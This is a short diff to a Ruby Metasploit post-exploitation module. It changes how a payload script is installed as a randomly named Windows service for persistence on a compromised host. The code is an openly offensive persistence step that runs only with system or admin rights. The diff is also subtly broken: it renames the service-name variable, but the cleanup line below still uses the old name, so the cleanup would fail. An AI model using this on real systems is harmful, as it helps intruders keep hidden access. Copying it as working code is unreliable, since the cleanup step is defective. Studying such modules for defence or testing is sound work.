@@ -338,9 +338,10 @@ class Metasploit3 < Msf::Post
   def install_as_service(script_on_target)
     if  is_system? or is_admin?
       print_status("Installing as service..")
-      nam = Rex::Text.rand_text_alpha(rand(8)+8)
-      print_status("Creating service #{nam}")
-      datastore['ACTION'] == 'REXE' ? service_create(nam, nam, "cmd /c \"#{script_on_target}\"") : service_create(nam, nam, "cscript \"#{script_on_target}\"")
+      datastore['ACTION'] == 'REXE' ? path = "cmd /c \"#{script_on_target}\"" : path = "cscript \"#{script_on_target}\""
+      name = Rex::Text.rand_text_alpha(rand(8)+8)
+      print_status("Creating service #{name}")
+      service_create(name, {:path => path})
 
       @clean_up_rc << "execute -H -f sc -a \"delete #{nam}\"\n"
     else
